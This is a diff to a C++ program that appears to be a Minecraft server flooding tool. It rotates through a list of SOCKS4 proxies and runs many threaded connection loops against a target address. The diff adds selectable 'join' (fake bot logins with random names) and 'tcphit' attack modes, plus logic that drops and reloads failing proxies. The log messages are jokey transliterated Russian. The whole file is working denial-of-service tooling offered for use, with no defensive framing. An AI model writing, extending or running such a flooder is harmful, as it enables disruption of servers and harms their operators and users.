@@ -4,134 +4,52 @@
 
 #include <algorithm>
 #include <csignal>
+#include <cstring>
 #include <fstream>
 #include <iostream>
 #include <mutex>
+#include <random>
 #include <sstream>
 #include <thread>
 
+#include "attack/attack.h"
+#include "attack/join.h"
+#include "attack/tcphit.h"
 #include "byte_buffer.h"
-#include "packet/handshake.h"
-#include "packet/login_start.h"
+#include "netutils.h"
 
-std::vector<sockaddr_in> proxies;
+std::vector<sockaddr_in*> proxies;
 int current = 0;
 std::mutex proxyMutex;
+std::string proxiesPath;
 
-ByteBuffer buf;
 ByteBuffer proxyConnect;
 int protocol;
+Attack* attack;
 
-std::string random_string(size_t length) {
-  auto randchar = []() -> char {
-    const char charset[] =
-        "0123456789"
-        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
-        "abcdefghijklmnopqrstuvwxyz";
-    const size_t max_index = (sizeof(charset) - 1);
-    return charset[rand() % max_index];
-  };
-  std::string str(length, 0);
-  std::generate_n(str.begin(), length, randchar);
-  return str;
+#define CLOSE_CALLBACK [](uv_handle_t* h) {                \
+  std::cout << "Дисконнектед фром зе сервер" << std::endl; \
+  free(h);                                                 \
 }
 
-void write(uv_stream_t* stream, const ByteBuffer& buf) {
-  uv_buf_t uvBuf[] = {{.base = (char*) buf.data.data(), .len = buf.length()}};
-  auto* req = (uv_write_t*) malloc(sizeof(uv_write_t));
-  uv_write(req, stream, uvBuf, 1, [](uv_write_t* req, int s) {
-    if (s < 0) {
-      std::cerr << "Каннот сенд дата ту зе сервер" << std::endl;
-    }
-    free(req);
-  });
-}
-
-void makeConnection(uv_loop_t* loop) {
-  proxyMutex.lock();
-  sockaddr_in dstAddr = proxies[current++];
-  if (current >= proxies.size()) {
-    current = 0;
-  }
+#define DELETE_GOVNOPROXY                                                                             \
+  char ip[22] {};                                                                                     \
+  uv_ip4_name((sockaddr_in*) dstAddr, ip, sizeof(ip));                                                \
+  std::cerr << "Варнинг!11!! Говнопрокси воз фаунд: " << ip << ":" << dstAddr->sin_port << std::endl; \
+  proxyMutex.lock();                                                                                  \
+  auto govnoproxy = std::find(proxies.begin(), proxies.end(), dstAddr);                               \
+  if (govnoproxy != proxies.end()) {                                                                  \
+    proxies.erase(govnoproxy);                                                                        \
+    free(dstAddr);                                                                                    \
+    if (proxies.empty()) {                                                                            \
+      std::cerr << "Олл гивен проксиез ар говнопрокси. Зер ар но мор проксиез" << std::endl;          \
+      std::cout << "Релоадинг говнопроксиез" << std::endl;                                            \
+      loadProxies();                                                                                  \
+    }                                                                                                 \
+  }                                                                                                   \
   proxyMutex.unlock();
 
-  auto* psock = (uv_tcp_t*) malloc(sizeof(uv_tcp_t));
-  uv_tcp_init(loop, psock);
-
-  auto* conn = (uv_connect_t*) malloc(sizeof(uv_connect_t));
-  uv_tcp_connect(conn, psock,
-                 (const sockaddr*) &dstAddr, [](uv_connect_t* con, int s) {
-                   makeConnection(con->handle->loop);
-                   if (s < 0) {
-                     std::cerr << "Каннот коннект ту зе прокси сервер" << std::endl;
-                     return;
-                   }
-                   //                   std::cout << "Коннектед ту зе сервер" << std::endl;
-
-                   uv_stream_t* stream = con->handle;
-                   free(con);
-
-                   write(stream, proxyConnect);
-
-                   uv_read_start(
-                       stream,
-                       [](uv_handle_t*, size_t s, uv_buf_t* b) {
-                         *b = uv_buf_init((char*) malloc(s), s);
-                       },
-                       [](uv_stream_t* stream, ssize_t nread, const uv_buf_t* b) {
-                         if (nread < 0) {
-                           uv_close((uv_handle_t*) stream, [](uv_handle_t* h) {
-                             std::cout << "Дисконнектед фром зе сервер" << std::endl;
-                             free(h);
-                           });
-                         } else {
-                           if (b->base[1] != 90) {
-                             std::cerr << "Реквест хас бин режектед бай прокси сервер виз коде " << (int) b->base[1] << std::endl;
-                           } else {
-                             ByteBuffer login;
-                             LoginStart(protocol, random_string(10)).writeWrapped(login);
-
-                             write(stream, buf);
-                             write(stream, login);
-
-                             uv_close((uv_handle_t*) stream, [](uv_handle_t* h) {
-                               std::cout << "Дисконнектед фром зе сервер" << std::endl;
-                               free(h);
-                             });
-                           }
-                         }
-
-                         free(b->base);
-                       });
-                 });
-}
-
-void splitIP(const std::string& source, std::string& ip, int& port) {
-  std::stringstream ss;
-  ss << source;
-  getline(ss, ip, ':');
-  ss >> port;
-  if (port == 0) {
-    port = 25565;
-  }
-}
-
-int main(int argc, char** argv) {
-  if (argc < 5) {
-    std::cerr << "Нот энаугхт аргументс!!11!" << std::endl;
-    exit(-1);
-  }
-
-  const char* proxiesPath = "proxies.txt";
-  const int loopCnt = atoi(argv[4]);
-  protocol = atoi(argv[3]);
-  // argv[2] = attack; (TODO: Implement attacks)
-  std::string ip;
-  int port;
-  splitIP(argv[1], ip, port);
-
-  std::cout << ip << " " << port << std::endl;
-
+void loadProxies() {
   std::ifstream proxiesFile(proxiesPath);
   if (!proxiesFile.good()) {
     std::cerr << "Каннот рид проксиес фром файл " << proxiesPath << std::endl;
@@ -143,16 +61,100 @@ int main(int argc, char** argv) {
     int proxyPort;
     splitIP(s, proxyIp, proxyPort);
 
-    sockaddr_in proxy {};
-    uv_ip4_addr(proxyIp.c_str(), proxyPort, &proxy);
+    auto* proxy = (sockaddr_in*) malloc(sizeof(sockaddr_in));
+    uv_ip4_addr(proxyIp.c_str(), proxyPort, proxy);
     proxies.push_back(proxy);
   }
   if (proxies.empty()) {
     std::cerr << "Каннот лоад проксиес!! Файл из емпти!" << std::endl;
     exit(-1);
   }
+  std::shuffle(std::begin(proxies), std::end(proxies),
+               std::default_random_engine {std::random_device {}()});
+}
 
-  Handshake(protocol, ip, port, Handshake::LOGIN).writeWrapped(buf);
+void connect(uv_loop_t* loop) {
+  proxyMutex.lock();
+  if (current >= proxies.size()) {
+    current = 0;
+  }
+  sockaddr_in* dstAddr = proxies[current++];
+  proxyMutex.unlock();
+
+  auto* psock = (uv_tcp_t*) malloc(sizeof(uv_tcp_t));
+  uv_tcp_init(loop, psock);
+
+  auto* conn = (uv_connect_t*) malloc(sizeof(uv_connect_t));
+  conn->data = dstAddr;
+  uv_tcp_connect(conn, psock,
+                 (const sockaddr*) dstAddr, [](uv_connect_t* con, int s) {
+                   connect(con->handle->loop);
+
+                   auto* dstAddr = (sockaddr_in*) con->data;
+                   if (s < 0) {
+                     DELETE_GOVNOPROXY
+                     return;
+                   }
+                   //                   std::cout << "Коннектед ту зе сервер" << std::endl;
+
+                   uv_stream_t* stream = con->handle;
+                   free(con);
+
+                   write(stream, proxyConnect);
+                   stream->data = dstAddr;
+
+                   uv_read_start(
+                       stream,
+                       [](uv_handle_t*, size_t s, uv_buf_t* b) {
+                         *b = uv_buf_init((char*) malloc(s), s);
+                       },
+                       [](uv_stream_t* stream, ssize_t nread, const uv_buf_t* b) {
+                         if (nread < 0) {
+                           uv_close((uv_handle_t*) stream, CLOSE_CALLBACK);
+                         } else {
+                           if (b->base[1] != 90) {
+                             std::cerr << "Реквест хас бин режектед бай прокси сервер виз коде " << (int) b->base[1] << std::endl;
+                             auto* dstAddr = (sockaddr_in*) stream->data;
+                             DELETE_GOVNOPROXY
+                             uv_close((uv_handle_t*) stream, CLOSE_CALLBACK);
+                           } else {
+                             attack->accept(stream, (const sockaddr_in*) stream->data);
+                             uv_close((uv_handle_t*) stream, CLOSE_CALLBACK);
+                           }
+                         }
+
+                         free(b->base);
+                       });
+                 });
+}
+
+int main(int argc, char** argv) {
+  if (argc < 5) {
+    std::cerr << "Нот энаугхт аргументс!!11!" << std::endl;
+    exit(-1);
+  }
+
+  proxiesPath = "proxies.txt";
+  const int loopCnt = atoi(argv[4]);
+  protocol = atoi(argv[3]);
+
+  std::string ip;
+  int port;
+  splitIP(argv[1], ip, port);
+
+  if (strcmp(argv[2], "join") == 0) {
+    attack = new JoinAttack(protocol, ip, port);
+  } else if(strcmp(argv[2], "tcphit") == 0) {
+    attack = new TcpHitAttack(protocol);
+  } else {
+    std::cout << argv[2] << " из нот а валид аттак!1!!" << std::endl;
+    exit(-1);
+  }
+
+  std::cout << ip << " " << port << std::endl;
+
+  loadProxies();
+  std::cout << "Лоадед " << proxies.size() << " говнопрксиес" << std::endl;
 
   /*
    * +----+----+----+----+----+----+----+----+----+----+....+----+
@@ -161,26 +163,28 @@ int main(int argc, char** argv) {
    *    1    1      2              4           variable       1
    */
 
-  unsigned short a, b, c, d;
-  sscanf(ip.c_str(), "%hu.%hu.%hu.%hu", &a, &b, &c, &d);
+  unsigned short i1, i2, i3, i4;
+  sscanf(ip.c_str(), "%hu.%hu.%hu.%hu", &i1, &i2, &i3, &i4);
 
-  proxyConnect.writeByte(4);                //      VN ; version number
-  proxyConnect.writeByte(1);                //      CD ; command code
-  proxyConnect.writeShort((short) port);    // DSTPORT ; port
-  proxyConnect.writeByte((unsigned char) a);//   DSTIP ; ip
-  proxyConnect.writeByte((unsigned char) b);
-  proxyConnect.writeByte((unsigned char) c);
-  proxyConnect.writeByte((unsigned char) d);
+  proxyConnect.writeByte(4);                 //      VN ; version number
+  proxyConnect.writeByte(1);                 //      CD ; command code
+  proxyConnect.writeShort((short) port);     // DSTPORT ; port
+  proxyConnect.writeByte((unsigned char) i1);//   DSTIP ; ip
+  proxyConnect.writeByte((unsigned char) i2);
+  proxyConnect.writeByte((unsigned char) i3);
+  proxyConnect.writeByte((unsigned char) i4);
   proxyConnect.writeByte(0);//    NULL ; null
 
-  signal(SIGPIPE, SIG_IGN);// Ignore SIGPIPE =)
+  signal(SIGPIPE, SIG_IGN);// Ignore SIGPIPE
 
   for (int i = 0; i < loopCnt; i++) {
     std::thread([=]() {
       auto* loop = (uv_loop_t*) malloc(sizeof(uv_loop_t));
       uv_loop_init(loop);
 
-      makeConnection(loop);
+      for (int i = 0; i < 4; i++) {
+        connect(loop);
+      }
 
       uv_run(loop, UV_RUN_DEFAULT);
       free(loop);
